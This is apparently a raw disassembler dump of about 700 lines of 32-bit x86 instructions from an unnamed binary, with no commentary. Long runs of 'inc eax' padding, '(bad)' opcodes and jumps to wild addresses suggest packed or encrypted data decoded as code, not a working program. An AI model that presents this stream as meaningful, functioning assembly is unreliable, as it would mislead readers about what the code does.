  40cd6a:	inc    ebx
  40cd6b:	bound  edx,QWORD PTR [ecx]
  40cd6d:	inc    eax
  40cd6e:	addr16 out 0xc9,al
  40cd71:	cmp    eax,0x14544d75
  40cd76:	shl    ecx,cl
  40cd78:	inc    esp
  40cd79:	das    
  40cd7a:	xchg   esp,eax
  40cd7b:	and    BYTE PTR [edi],bh
  40cd7d:	inc    eax
  40cd7e:	cmp    al,0xbf
  40cd80:	imul   ebp,ebx,0x105e1162
  40cd86:	xchg   ebx,eax
  40cd87:	aam    0x24
  40cd89:	xor    BYTE PTR [ebp+0x3640d43c],bl
  40cd8f:	and    eax,DWORD PTR [eax+0x40]
  40cd92:	add    BYTE PTR [eax+0x40],al
  40cd95:	inc    eax
  40cd96:	inc    eax
  40cd97:	inc    eax
  40cd98:	inc    eax
  40cd99:	int    0x4e
  40cd9b:	and    BYTE PTR [esi-0x5a],ah
  40cd9e:	sbb    DWORD PTR [ebx+0x7e38414f],edx
  40cda4:	addr16 test al,0x40
  40cda7:	sbb    BYTE PTR ds:0xfc0cc42d,ah
  40cdad:	inc    eax
  40cdae:	inc    eax
  40cdaf:	inc    eax
  40cdb0:	inc    eax
  40cdb1:	inc    eax
  40cdb2:	inc    eax
  40cdb3:	inc    eax
  40cdb4:	inc    eax
  40cdb5:	inc    eax
  40cdb6:	inc    eax
  40cdb7:	adc    dh,BYTE PTR gs:[edi+0x77]
  40cdbb:	mov    esp,0x26676340
  40cdc0:	inc    eax
  40cdc1:	push   ecx
  40cdc2:	and    al,ch
  40cdc4:	inc    ebx
  40cdc5:	and    ebx,eax
  40cdc7:	adc    al,BYTE PTR [ebx]
  40cdc9:	sbb    edx,DWORD PTR [ecx+ecx*8]
  40cdcc:	inc    eax
  40cdcd:	cld    
  40cdce:	xor    BYTE PTR [ebp+0x40],al
  40cdd1:	inc    eax
  40cdd2:	inc    eax
  40cdd3:	inc    eax
  40cdd4:	inc    eax
  40cdd5:	inc    eax
  40cdd6:	int3   
  40cdd7:	jne    0x40ce19
  40cdd9:	inc    eax
  40cdda:	les    ebp,FWORD PTR [esi+esi*2]
  40cddd:	sub    BYTE PTR [edx+0x20],ah
  40cde0:	inc    ecx
  40cde1:	inc    eax
  40cde2:	adc    al,0xa4
  40cde4:	sub    eax,DWORD PTR [eax+0x73]
  40cde7:	pop    ds
  40cde8:	adc    al,0x40
  40cdea:	and    eax,0xa42ac52e
  40cdef:	in     al,0xcd
  40cdf1:	je     0x40cdb1
  40cdf3:	in     eax,dx
  40cdf4:	int    0x7b
  40cdf6:	bound  esp,QWORD PTR [edx-0x50]
  40cdf9:	inc    eax
  40cdfa:	push   eax
  40cdfb:	mov    eax,ds:0x40c10040
  40ce00:	inc    eax
  40ce01:	inc    eax
  40ce02:	inc    eax
  40ce03:	add    BYTE PTR [eax-0x41],al
  40ce06:	inc    ebp
  40ce07:	outs   dx,BYTE PTR ds:[esi]
  40ce08:	inc    edx
  40ce09:	or     eax,0xbf4d3340
  40ce0e:	dec    esi
  40ce0f:	fadd   DWORD PTR [edi-0x5abdbf35]
  40ce15:	mov    esp,0x444865d4
  40ce1a:	jae    0x40ce71
  40ce1c:	stos   DWORD PTR es:[edi],eax
  40ce1d:	mov    eax,0x46151026
  40ce22:	inc    eax
  40ce23:	or     eax,0xbd3cd509
  40ce28:	inc    eax
  40ce29:	inc    eax
  40ce2a:	inc    eax
  40ce2b:	inc    eax
  40ce2c:	inc    eax
  40ce2d:	inc    eax
  40ce2e:	inc    eax
  40ce2f:	inc    eax
  40ce30:	inc    DWORD PTR [eax+0x41]
  40ce33:	inc    ecx
  40ce34:	inc    eax
  40ce35:	push   edi
  40ce36:	mov    ds:0x42f96ac9,eax
  40ce3b:	cmp    al,0x40
  40ce3d:	sbb    BYTE PTR [edx+0x45],dl
  40ce40:	dec    ebp
  40ce41:	push   edx
  40ce42:	xchg   esp,eax
  40ce43:	shl    DWORD PTR [edx-0xf],cl
  40ce46:	and    ah,al
  40ce48:	fadd   st(3),st
  40ce4a:	push   es
  40ce4b:	fiadd  DWORD PTR [eax+0x50]
  40ce4e:	xor    ebx,DWORD PTR [eax+0x4040401a]
  40ce54:	inc    eax
  40ce55:	inc    eax
  40ce56:	inc    eax
  40ce57:	inc    eax
  40ce58:	inc    eax
  40ce59:	inc    eax
  40ce5a:	inc    eax
  40ce5b:	sub    bh,BYTE PTR [eax+0x6a]
  40ce5e:	inc    eax
  40ce5f:	xor    DWORD PTR [ecx+0x53],ebp
  40ce62:	fmul   QWORD PTR [ebp+0x5d]
  40ce65:	xor    al,BYTE PTR [eax+0x77]
  40ce68:	and    ecx,ebp
  40ce6a:	push   cs
  40ce6b:	push   edx
  40ce6c:	arpl   bx,cx
  40ce6e:	jno    0x40cee3
  40ce70:	sub    eax,0x40c93cc2
  40ce75:	inc    eax
  40ce76:	inc    eax
  40ce77:	inc    eax
  40ce78:	inc    eax
  40ce79:	inc    eax
  40ce7a:	inc    eax
  40ce7b:	inc    eax
  40ce7c:	add    al,bh
  40ce7e:	xor    eax,0x6dad4540
  40ce83:	addr16 mov eax,0xf1407928
  40ce89:	add    DWORD PTR [esi+ecx*1+0x5],eax
  40ce8d:	arpl   WORD PTR [edx],sp
  40ce8f:	inc    eax
  40ce90:	push   edi
  40ce91:	arpl   WORD PTR [eax+0x40],dx
  40ce94:	inc    eax
  40ce95:	inc    eax
  40ce96:	inc    eax
  40ce97:	inc    eax
  40ce98:	inc    eax
  40ce99:	and    eax,0x38404040
  40ce9e:	inc    ebx
  40ce9f:	add    BYTE PTR [esi+0x41],al
  40cea2:	ja     0x40cef6
  40cea4:	lds    esp,FWORD PTR [esi+0x41]
  40cea7:	xchg   DWORD PTR [eax+eax*2],ebp
  40ceaa:	mov    edi,0x561c4ae2
  40ceaf:	mov    esp,0x268a40fd
  40ceb4:	loope  0x40ce8e
  40ceb6:	enter  0x4a05,0x40
  40ceba:	cmp    DWORD PTR [esi+0x415472f8],ebx
  40cec0:	test   al,0x43
  40cec2:	inc    eax
  40cec3:	inc    eax
  40cec4:	inc    eax
  40cec5:	inc    eax
  40cec6:	inc    eax
  40cec7:	inc    eax
  40cec8:	inc    eax
  40cec9:	inc    eax
  40ceca:	inc    eax
  40cecb:	inc    eax
  40cecc:	retf   
  40cecd:	push   0x41b49e67
  40ced2:	inc    edx
  40ced3:	inc    eax
  40ced4:	aas    
  40ced5:	loope  0x40cefc
  40ced7:	int3   
  40ced8:	test   al,0x98
  40ceda:	sub    al,BYTE PTR [eax+0x55]
  40cedd:	pop    ss
  40cede:	push   edx
  40cedf:	bound  edx,QWORD PTR [edx]
  40cee1:	sbb    al,0x41
  40cee3:	inc    eax
  40cee4:	inc    eax
  40cee5:	inc    eax
  40cee6:	inc    eax
  40cee7:	inc    eax
  40cee8:	inc    eax
  40cee9:	rol    DWORD PTR [eax+0x40],0x40
  40ceed:	push   esi
  40ceee:	repz aad 0xcb
  40cef1:	mov    WORD PTR [eax+0x17134043],gs
  40cef7:	pop    eax
  40cef8:	push   esp
  40cef9:	adc    eax,0x5b407912
  40cefe:	(bad)  
  40ceff:	jmp    0xc8859c11
  40cf04:	mov    bl,0x1f
  40cf06:	rol    edx,1
  40cf08:	retf   
  40cf09:	push   esp
  40cf0a:	inc    ecx
  40cf0b:	cmp    al,0x93
  40cf0d:	inc    eax
  40cf0e:	inc    eax
  40cf0f:	add    BYTE PTR [eax+0x40],al
  40cf12:	inc    eax
  40cf13:	inc    eax
  40cf14:	inc    eax
  40cf15:	inc    eax
  40cf16:	data16 jecxz 0x40cf85
  40cf19:	dec    edi
  40cf1a:	xor    eax,0x77b45c51
  40cf1f:	sub    BYTE PTR [edx+eax*2+0x45],dl
  40cf23:	lock fs dec esp
  40cf26:	test   edi,esp
  40cf28:	dec    edi
  40cf29:	sub    ebx,DWORD PTR [ebx+0x4e]
  40cf2c:	inc    eax
  40cf2d:	dec    ebp
  40cf2e:	jae    0x40cf99
  40cf30:	hlt    
  40cf31:	mov    eax,0x7fd2cc48
  40cf36:	dec    esp
  40cf37:	arpl   dx,ax
  40cf39:	arpl   WORD PTR [eax+0x40],ax
  40cf3c:	inc    eax
  40cf3d:	inc    eax
  40cf3e:	inc    eax
  40cf3f:	inc    eax
  40cf40:	inc    eax
  40cf41:	inc    eax
  40cf42:	inc    eax
  40cf43:	inc    eax
  40cf44:	pop    edx
  40cf45:	sub    eax,ebp
  40cf47:	adc    DWORD PTR [edx-0x7d479391],0xffffffa8
  40cf4e:	dec    edi
  40cf4f:	inc    eax
  40cf50:	scas   eax,DWORD PTR es:[edi]
  40cf51:	push   sp
  40cf53:	dec    ebp
  40cf54:	mov    BYTE PTR [eax],dl
  40cf56:	inc    ecx
  40cf57:	inc    eax
  40cf58:	inc    eax
  40cf59:	inc    eax
  40cf5a:	inc    eax
  40cf5b:	inc    eax
  40cf5c:	inc    eax
  40cf5d:	int3   
  40cf5e:	jne    0x40cfa0
  40cf60:	sahf   
  40cf61:	sub    BYTE PTR [edi],ah
  40cf63:	push   esi
  40cf64:	popf   
  40cf65:	sbb    eax,DWORD PTR [edx+0x48]
  40cf68:	mov    esi,0x14f8be5f
  40cf6d:	add    BYTE PTR [ecx+0x3d],0x8e
  40cf71:	mov    bh,0x70
  40cf73:	imul   ecx,DWORD PTR [ebp-0x56],0x4a
  40cf77:	ret    
  40cf78:	dec    esp
  40cf79:	adc    BYTE PTR [eax+0x2c],ah
  40cf7c:	fld    QWORD PTR [eax+0x0]
  40cf7f:	rol    DWORD PTR [eax+0x40],0x40
  40cf83:	inc    eax
  40cf84:	add    BYTE PTR [eax+0x46],al
  40cf87:	and    BYTE PTR [ebp+0x30],al
  40cf8a:	xor    eax,0xc9767a2d
  40cf8f:	jl     0x40cfcd
  40cf91:	sahf   
  40cf92:	adc    edx,DWORD PTR [eax+0x34a8a866]
  40cf98:	in     al,0xbe
  40cf9a:	std    
  40cf9b:	icebp  
  40cf9c:	mov    ebp,0x62954612
  40cfa1:	inc    eax
  40cfa2:	pop    ds
  40cfa3:	inc    eax
  40cfa4:	inc    eax
  40cfa5:	inc    eax
  40cfa6:	inc    eax
  40cfa7:	inc    eax
  40cfa8:	inc    eax
  40cfa9:	inc    eax
  40cfaa:	inc    eax
  40cfab:	inc    DWORD PTR [eax+0x47]
  40cfae:	addr16 push eax
  40cfb0:	test   eax,0xb3403c63
  40cfb5:	mov    ds:0xeba61518,eax
  40cfba:	push   eax
  40cfbb:	inc    eax
  40cfbc:	call   DWORD PTR [ebx]
  40cfbe:	push   edx
  40cfbf:	retf   
  40cfc0:	dec    esp
  40cfc1:	fsub   DWORD PTR [edx+0x4c]
  40cfc4:	xchg   ebx,eax
  40cfc5:	in     al,dx
  40cfc6:	imul   eax,DWORD PTR [ebx-0xf],0x40
  40cfca:	inc    eax
  40cfcb:	inc    eax
  40cfcc:	inc    eax
  40cfcd:	inc    eax
  40cfce:	inc    eax
  40cfcf:	inc    eax
  40cfd0:	inc    eax
  40cfd1:	inc    eax
  40cfd2:	inc    eax
  40cfd3:	push   edx
  40cfd4:	and    BYTE PTR [eax-0x7e],al
  40cfd7:	xor    ebp,DWORD PTR [esi+esi*8+0x4070e85e]
  40cfde:	jae    0x40d027
  40cfe0:	jno    0x40cfe2
  40cfe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfe3:	pop    eax
  40cfe4:	bound  eax,QWORD PTR [eax+0x66]
  40cfe7:	and    ebx,DWORD PTR [edi+eiz*2]
  40cfea:	or     eax,0xb7587b62
  40cfef:	jbe    0x40d043
  40cff1:	inc    eax
  40cff2:	inc    eax
  40cff3:	inc    eax
  40cff4:	inc    eax
  40cff5:	inc    eax
  40cff6:	inc    eax
  40cff7:	inc    eax
  40cff8:	inc    eax
  40cff9:	add    BYTE PTR [eax+0x6c],al
  40cffc:	or     ch,BYTE PTR [eax+eax*2]
  40cfff:	aas    
  40d000:	sub    ecx,DWORD PTR [eax+0x34]
  40d003:	sub    ch,BYTE PTR [ebx-0x499bfbe]
  40d009:	rol    BYTE PTR [ebx+0x64],1
  40d00c:	inc    eax
  40d00d:	inc    eax
  40d00e:	inc    eax
  40d00f:	inc    eax
  40d010:	inc    eax
  40d011:	inc    eax
  40d012:	and    eax,0x42404040
  40d017:	outs   dx,BYTE PTR ds:[esi]
  40d018:	inc    eax
  40d019:	mov    edi,0xf94c7162
  40d01e:	ins    DWORD PTR es:[edi],dx
  40d01f:	les    edx,FWORD PTR [esi+eiz*2+0x77]
  40d023:	sub    cl,dl
  40d025:	mov    ds:0xbf404fd7,al
  40d02a:	outs   dx,DWORD PTR ds:[esi]
  40d02b:	push   edx
  40d02c:	jg     0x40d092
  40d02e:	in     eax,0x41
  40d030:	inc    eax
  40d031:	lock sub esp,DWORD PTR [ebx+0x14]
  40d035:	mov    dh,0x3c
  40d037:	dec    esi
  40d038:	inc    eax
  40d039:	inc    eax
  40d03a:	inc    eax
  40d03b:	inc    eax
  40d03c:	inc    eax
  40d03d:	inc    eax
  40d03e:	inc    eax
  40d03f:	inc    eax
  40d040:	inc    eax
  40d041:	inc    eax
  40d042:	inc    eax
  40d043:	xchg   ebp,eax
  40d044:	arpl   WORD PTR [ebp+ecx*1+0x50846266],bp
  40d04b:	fdiv   DWORD PTR [ecx+0x55]
  40d04e:	arpl   WORD PTR [eax-0x2ebfa3f0],sp
  40d054:	sbb    al,0x51
  40d056:	xchg   edx,eax
  40d057:	adc    eax,0x46404e58
  40d05c:	sub    DWORD PTR [esp+ecx*1],esp
  40d05f:	inc    edi
  40d060:	ins    DWORD PTR es:[edi],dx
  40d061:	js     0x40d0a3
  40d063:	mov    cl,0x40
  40d065:	inc    eax
  40d066:	inc    eax
  40d067:	inc    eax
  40d068:	inc    eax
  40d069:	inc    eax
  40d06a:	rol    DWORD PTR [eax+0x40],0x30
  40d06e:	push   cs
  40d06f:	fs into 
  40d071:	jmp    0x62281d38
  40d076:	imul   ecx,DWORD PTR [edi],0x15
  40d079:	mov    WORD PTR [ebp+0x40],ds
  40d07c:	sbb    DWORD PTR [ebx],ecx
  40d07e:	lods   eax,DWORD PTR ds:[esi]
  40d07f:	cld    
  40d080:	cli    
  40d081:	bound  ecx,QWORD PTR [eax+eax*2+0x63712547]
  40d088:	pushf  
  40d089:	pop    eax
  40d08a:	jns    0x40d0cc
  40d08c:	cmc    
  40d08d:	sub    BYTE PTR ds:[ebx],bh
  40d090:	dec    ecx
  40d091:	sub    al,0x40
  40d093:	inc    eax
  40d094:	add    BYTE PTR [eax+0x40],al
  40d097:	inc    eax
  40d098:	inc    eax
  40d099:	inc    eax
  40d09a:	inc    eax
  40d09b:	fmul   QWORD PTR [eax-0x12]
  40d09e:	stc    
  40d09f:	push   edx
  40d0a0:	adc    bh,0x1
  40d0a3:	bound  eax,QWORD PTR [eax-0xd]
  40d0a6:	inc    esi
  40d0a7:	and    al,0x48
  40d0a9:	call   0x5823:0xbf4047c9
  40d0b0:	loope  0x40d0fb
  40d0b2:	mov    esp,0xbfcc4040
  40d0b7:	data16 jge 0x40d06f
  40d0ba:	inc    eax
  40d0bb:	inc    eax
  40d0bc:	inc    eax
  40d0bd:	inc    eax
  40d0be:	inc    eax
  40d0bf:	inc    eax
  40d0c0:	inc    eax
  40d0c1:	inc    eax
  40d0c2:	inc    eax
  40d0c3:	inc    eax
  40d0c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0c5:	imul   eax,DWORD PTR [ebx+esi*1+0x51],0xa3986e71
  40d0cd:	dec    esp
  40d0ce:	inc    eax
  40d0cf:	push   es
  40d0d0:	outs   dx,DWORD PTR ds:[esi]
  40d0d1:	sub    BYTE PTR [edx+0x66],cl
  40d0d4:	(bad)  
  40d0d5:	enter  0xb348,0x42
  40d0d9:	push   edx
  40d0da:	and    BYTE PTR [ecx-0x3d],bh
  40d0dd:	cmp    al,0x40
  40d0df:	and    DWORD PTR [eax-0x2b],esp
  40d0e2:	aas    
  40d0e3:	inc    dx
  40d0e5:	inc    eax
  40d0e6:	inc    eax
  40d0e7:	inc    eax
  40d0e8:	inc    eax
  40d0e9:	inc    eax
  40d0ea:	inc    eax
  40d0eb:	int3   
  40d0ec:	jne    0x40d12e
  40d0ee:	add    BYTE PTR [eax+0x35],al
  40d0f1:	add    al,0x26
  40d0f3:	sbb    eax,0x4065a596
  40d0f8:	or     ecx,eax
  40d0fa:	imul   ebp,DWORD PTR [eax+0x4016920d],0x106565f3
  40d104:	gs call 0x4101d14a
  40d10a:	inc    eax
  40d10b:	inc    eax
  40d10c:	inc    eax
  40d10d:	add    BYTE PTR [eax+0x6c],al
  40d110:	inc    eax
  40d111:	fs pop edi
  40d113:	jno    0x40d0d1
  40d115:	data16 arpl bp,sp
  40d118:	inc    eax
  40d119:	adc    DWORD PTR [ebx+0x28],esp
  40d11c:	inc    edx
  40d11d:	adc    DWORD PTR fs:[esi-0x67],edi
  40d121:	pop    ebx
  40d122:	pop    eax
  40d123:	push   edx
  40d124:	push   cs
  40d125:	stc    
  40d126:	inc    eax
  40d127:	push   0xffffffaa
  40d129:	shr    DWORD PTR [ecx+0x194c8cd],1
  40d12f:	ja     0x40d1ad
  40d131:	pop    ebx
  40d132:	and    al,0x24
  40d134:	inc    eax
  40d135:	inc    eax
  40d136:	inc    eax
  40d137:	inc    eax
  40d138:	inc    eax
  40d139:	inc    eax
  40d13a:	inc    eax
  40d13b:	inc    eax
  40d13c:	inc    DWORD PTR [eax+0x65]
  40d13f:	inc    edx
  40d140:	push   0xe3719bc0
  40d145:	sub    eax,0xe1c216d3
  40d14a:	xchg   edx,eax
  40d14b:	inc    edi
  40d14c:	addr16 gs nop
  40d14f:	pop    esi
  40d150:	dec    esp
  40d151:	cmp    al,0x15
  40d153:	inc    eax
  40d154:	inc    eax
  40d155:	inc    eax
  40d156:	inc    eax
  40d157:	inc    eax
  40d158:	inc    eax
  40d159:	inc    eax
  40d15a:	inc    eax
  40d15b:	inc    eax
  40d15c:	inc    eax
  40d15d:	push   ecx
  40d15e:	loope  0x40d1cf
  40d160:	arpl   WORD PTR [edx-0x40379de1],dx
  40d166:	lahf   
  40d167:	sbb    BYTE PTR [ebx],dl
  40d169:	adc    eax,0x4812403e
  40d16e:	jmp    0x4ba6d1c5
  40d173:	add    edi,eax
  40d175:	jno    0x40d1b7
  40d177:	inc    eax
  40d178:	inc    eax
  40d179:	inc    eax
  40d17a:	inc    eax
  40d17b:	inc    eax
  40d17c:	inc    eax
  40d17d:	inc    eax
  40d17e:	add    ch,ah
  40d180:	lds    esp,FWORD PTR [ebx-0x3e]
  40d183:	les    esp,FWORD PTR [ecx+0x3853688e]
  40d189:	dec    edi
  40d18a:	fs dec eax
  40d18c:	bound  ecx,QWORD PTR [edx+0x404040f1]
  40d192:	inc    eax
  40d193:	inc    eax
  40d194:	inc    eax
  40d195:	and    eax,0xe1404040
  40d19a:	ins    DWORD PTR es:[edi],dx
  40d19b:	xor    al,0xfa
  40d19d:	inc    ebp
  40d19e:	add    eax,0x62656da8
  40d1a3:	seto   ch
  40d1a6:	xchg   ecx,edx
  40d1a8:	adc    eax,0xd9a6f61
  40d1ad:	jns    0x40d1f6
  40d1af:	popa   
  40d1b0:	outs   dx,DWORD PTR ds:[esi]
  40d1b1:	inc    ecx
  40d1b2:	and    al,0x90
  40d1b4:	inc    ebp
  40d1b5:	inc    ebp
  40d1b6:	gs xchg esi,eax
  40d1b8:	mov    bl,0x21
  40d1ba:	push   edx
  40d1bb:	push   ss
  40d1bc:	(bad)  
  40d1bd:	sub    eax,0x40404040
  40d1c2:	inc    eax
  40d1c3:	inc    eax
  40d1c4:	inc    eax
  40d1c5:	inc    eax
  40d1c6:	inc    eax
  40d1c7:	inc    eax
  40d1c8:	aas    
  40d1c9:	push   0x35d54e42
  40d1ce:	and    eax,DWORD PTR [ebx-0x7c]
  40d1d1:	inc    eax
  40d1d2:	mov    bl,0x62
  40d1d4:	and    eax,0xc3c0f90c
  40d1d9:	inc    eax
  40d1da:	inc    eax
  40d1db:	inc    eax
  40d1dc:	inc    eax
  40d1dd:	inc    eax
  40d1de:	inc    eax
  40d1df:	rol    DWORD PTR [eax+0x40],0x40
  40d1e3:	dec    edi
  40d1e4:	or     DWORD PTR [ecx-0x37307139],edi
  40d1ea:	inc    eax
  40d1eb:	jne    0x40d22d
  40d1ed:	cmp    DWORD PTR fs:0x40407aa8,edx
  40d1f4:	add    BYTE PTR [eax+0x40],al
  40d1f7:	inc    eax
  40d1f8:	inc    eax
  40d1f9:	inc    eax
  40d1fa:	inc    eax
  40d1fb:	inc    eax
  40d1fc:	push   ecx
  40d1fd:	mov    eax,ds:0x119752fa
  40d202:	bound  edi,QWORD PTR ds:0xe61a7691
  40d208:	inc    sp
  40d20a:	test   al,0xec
  40d20c:	adc    esp,ecx
  40d20e:	loope  0x40d1b8
  40d210:	mov    WORD PTR [ecx-0x442edcbe],es
  40d216:	bound  edx,QWORD PTR [esi]
  40d218:	adc    eax,0x40404040
  40d21d:	inc    eax
  40d21e:	inc    eax
  40d21f:	inc    eax
  40d220:	inc    eax
  40d221:	inc    eax
  40d222:	inc    eax
  40d223:	ret    
  40d224:	sub    ah,cl
  40d226:	mov    edi,0x474b2042
  40d22b:	inc    ebx
  40d22c:	(bad)  
  40d22d:	enter  0x6108,0x84
  40d231:	bound  eax,QWORD PTR [esi+0x40]
  40d234:	xchg   DWORD PTR [edi],ecx
  40d236:	push   ecx
  40d237:	cmp    eax,0xe05c3f65
  40d23c:	bound  edi,QWORD PTR [edi+0x40]
  40d23f:	outs   dx,DWORD PTR fs:[esi]
  40d241:	pushf  
  40d242:	cli    
  40d243:	push   0x30b31259
  40d248:	and    al,0x40
  40d24a:	inc    eax
  40d24b:	inc    eax
  40d24c:	inc    eax
  40d24d:	inc    eax
  40d24e:	inc    eax
  40d24f:	int3   
  40d250:	jne    0x40d292
  40d252:	data16 mov BYTE PTR [ecx+0x34],bh
  40d256:	aad    0x58
  40d258:	dec    edi
  40d259:	push   esp
  40d25a:	inc    edx
  40d25b:	jmp    0x40d251
  40d25d:	dec    esp
  40d25e:	lods   eax,DWORD PTR ds:[esi]
  40d25f:	xchg   ebx,eax
  40d260:	loopne 0x40d289
  40d262:	in     al,dx
  40d263:	pop    esi
  40d264:	bound  esi,QWORD PTR [edx]
  40d266:	cmp    DWORD PTR [edi+ebp*1+0x64],esp
  40d26a:	retf   0x425a
  40d26d:	mov    eax,ds:0x64e1510a
  40d272:	test   al,0x73
  40d274:	enter  0x8c1,0x40
  40d278:	add    cl,al
  40d27a:	inc    eax
  40d27b:	inc    eax
  40d27c:	inc    eax
  40d27d:	inc    eax
  40d27e:	add    BYTE PTR [eax+0x7d],al
  40d281:	mov    eax,ds:0x2886116f
  40d286:	dec    esp
  40d287:	mov    ah,0xd5
  40d289:	push   ebx
  40d28a:	and    al,0x80
  40d28c:	dec    edx
  40d28d:	test   al,0xd
  40d28f:	jo     0x40d2bd
  40d291:	arpl   WORD PTR [ebx+0xd],dx
  40d294:	mov    ds:0xfb53cb10,al
  40d299:	inc    edi
  40d29a:	aad    0xcd
  40d29c:	test   BYTE PTR [edi+eiz*2+0x40],al
  40d2a0:	inc    eax
  40d2a1:	inc    eax
  40d2a2:	inc    eax
  40d2a3:	inc    eax
  40d2a4:	inc    eax
  40d2a5:	inc    eax
  40d2a6:	inc    eax
  40d2a7:	inc    DWORD PTR [eax+0x3b]
  40d2aa:	bound  esp,QWORD PTR [edx]
  40d2ac:	and    eax,DWORD PTR [ebx+0x15]
  40d2af:	add    ch,BYTE PTR [ebx+0x25971194]
  40d2b5:	adc    DWORD PTR [ebp+0x42],eax
  40d2b8:	mov    esp,0x64215a46
  40d2bd:	fcom   st(2)
  40d2bf:	mov    al,BYTE PTR ds:0x40404039
  40d2c5:	inc    eax
  40d2c6:	inc    eax
  40d2c7:	inc    eax
  40d2c8:	inc    eax
  40d2c9:	inc    eax
  40d2ca:	inc    eax
  40d2cb:	inc    eax
  40d2cc:	rcr    DWORD PTR [eax-0x6],1
  40d2cf:	arpl   WORD PTR [ecx],di
  40d2d1:	(bad)  
  40d2d2:	retf   
  40d2d3:	and    BYTE PTR [edi-0x5d59b9d],bh
  40d2d9:	bound  eax,QWORD PTR [ebp+0x7]
  40d2dc:	sub    al,0x37
  40d2de:	add    DWORD PTR [edx-0x7e],edx
  40d2e1:	and    eax,0xa59fd535
  40d2e6:	push   edx
  40d2e7:	stos   DWORD PTR es:[edi],eax
  40d2e8:	push   0x2f
  40d2ea:	cmp    BYTE PTR [eax],0x43
  40d2ed:	fadd   QWORD PTR [eax+0x40]
  40d2f0:	inc    eax
  40d2f1:	inc    eax
  40d2f2:	inc    eax
  40d2f3:	inc    eax
  40d2f4:	inc    eax
  40d2f5:	inc    eax
  40d2f6:	add    ch,cl
  40d2f8:	dec    esp
  40d2f9:	add    esp,DWORD PTR [ecx+0x6b9137c5]
  40d2ff:	xchg   DWORD PTR [ecx+0x66],eax
  40d302:	bound  eax,QWORD PTR [ebp+ebx*1+0x1c]
  40d306:	inc    edx
  40d307:	and    eax,0x4c428005
  40d30c:	(bad)  
  40d30d:	sbb    esp,DWORD PTR [ecx]
  40d30f:	dec    edi
  40d310:	sub    al,0x40
  40d312:	inc    eax
  40d313:	inc    eax
  40d314:	inc    eax
  40d315:	inc    eax
  40d316:	inc    eax
  40d317:	and    eax,0x65404040
  40d31c:	aam    0x48
  40d31e:	xchg   esp,eax
  40d31f:	dec    esp
  40d320:	inc    ebp
  40d321:	aam    0x88
  40d323:	inc    ecx
  40d324:	sti    
  40d325:	sub    al,cl
  40d327:	push   ebx
  40d328:	mov    eax,ds:0xa866de52
  40d32d:	push   0x46
  40d32f:	push   esp
  40d330:	pop    esp
  40d331:	lds    ebp,FWORD PTR [eax+0x404011fe]
  40d337:	inc    eax
  40d338:	inc    eax
  40d339:	inc    eax
  40d33a:	inc    eax
  40d33b:	inc    eax
  40d33c:	inc    eax
  40d33d:	inc    eax
  40d33e:	inc    eax
  40d33f:	nop
  40d340:	iret   
  40d341:	adc    BYTE PTR [ebp+0x5d],ch
  40d344:	adc    ah,BYTE PTR [ebp-0x1]
  40d347:	ror    DWORD PTR fs:[eax],cl
  40d34a:	popa   
  40d34b:	in     eax,0xc0
  40d34d:	inc    ecx
  40d34e:	mov    ecx,edx
  40d350:	inc    eax
  40d351:	inc    eax
  40d352:	arpl   ax,di
  40d354:	inc    eax
  40d355:	inc    eax
  40d356:	inc    eax
  40d357:	inc    eax
  40d358:	inc    eax
  40d359:	inc    eax
  40d35a:	rol    DWORD PTR [eax+0x40],0x15
  40d35e:	bound  dx,DWORD PTR [eax+0x40]
  40d362:	push   ecx
  40d363:	aas    
  40d364:	ror    ebp,0xfc
  40d367:	shl    BYTE PTR [eax+eax*2],1
  40d36a:	add    edx,DWORD PTR [ecx-0x4f]
  40d36d:	inc    esp
  40d36e:	or     eax,0x1f40c544
  40d373:	xor    edx,DWORD PTR [edx+0xd]
  40d376:	inc    esp
  40d377:	int    0x22
  40d379:	fstp   TBYTE PTR [ebx+0x4020d5e3]
  40d37f:	inc    eax
  40d380:	add    BYTE PTR [eax+0x40],al
  40d383:	inc    eax
  40d384:	inc    eax
  40d385:	inc    eax
  40d386:	inc    eax
  40d387:	inc    esi
  40d388:	dec    eax
  40d389:	(bad)  
  40d38a:	cmc    
  40d38b:	add    esi,DWORD PTR [ecx+0x38]
  40d38e:	inc    eax
  40d38f:	pop    esp
  40d390:	adc    DWORD PTR [esi-0x80],edx
  40d393:	pop    ds
  40d394:	in     eax,dx
  40d395:	cmc    
  40d396:	sub    bh,cl
  40d398:	retf   
  40d399:	dec    ebp
  40d39a:	out    0x3,eax
  40d39c:	xor    esp,DWORD PTR [esp+edx*2-0x6]
  40d3a0:	mov    esp,0x1b1f47d5
  40d3a5:	dec    eax
  40d3a6:	ss add eax,0x3cb4a0d
  40d3ac:	inc    eax
  40d3ad:	inc    eax
  40d3ae:	inc    eax
  40d3af:	inc    eax
  40d3b0:	inc    eax
  40d3b1:	inc    eax
  40d3b2:	inc    eax
  40d3b3:	inc    eax
  40d3b4:	inc    eax
  40d3b5:	inc    eax
  40d3b6:	out    dx,eax
  40d3b7:	cmp    al,0x45
  40d3b9:	arpl   WORD PTR [ebp-0x6c],ax
  40d3bc:	ds pop ds
  40d3be:	sbb    ebx,DWORD PTR [esi+0x40]
  40d3c1:	push   edi
  40d3c2:	je     0x40d3d5
  40d3c4:	dec    ecx
  40d3c5:	dec    eax
  40d3c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3c7:	dec    ebp
  40d3c8:	inc    eax
  40d3c9:	arpl   WORD PTR [eax-0x54],sp
  40d3cc:	jecxz  0x40d40e
  40d3ce:	inc    eax
  40d3cf:	inc    eax
  40d3d0:	inc    eax
  40d3d1:	inc    eax
  40d3d2:	inc    eax
  40d3d3:	int3   
  40d3d4:	jne    0x40d416
  40d3d6:	aas    
  40d3d7:	pop    esi
  40d3d8:	mov    eax,ds:0xcb642740
  40d3dd:	jge    0x40d427
  40d3df:	fs mov edi,0x154c14e4
  40d3e5:	dec    eax
  40d3e6:	mov    edi,0x71f8bf01
  40d3eb:	rol    DWORD PTR [ecx+0x2a],1
  40d3ee:	add    eax,DWORD PTR [eax+0x0]
  40d3f1:	rol    DWORD PTR [eax+0x40],0x40
  40d3f5:	inc    eax
  40d3f6:	add    BYTE PTR [eax+0x66],al
  40d3f9:	mov    edi,0x4e3a69c3
  40d3fe:	mov    edi,0xbf5c641f
  40d403:	mov    edi,0x7163e852
  40d408:	mov    ebp,0x4040bfc5
  40d40d:	inc    eax
  40d40e:	inc    eax
  40d40f:	inc    eax
  40d410:	inc    eax
  40d411:	inc    eax
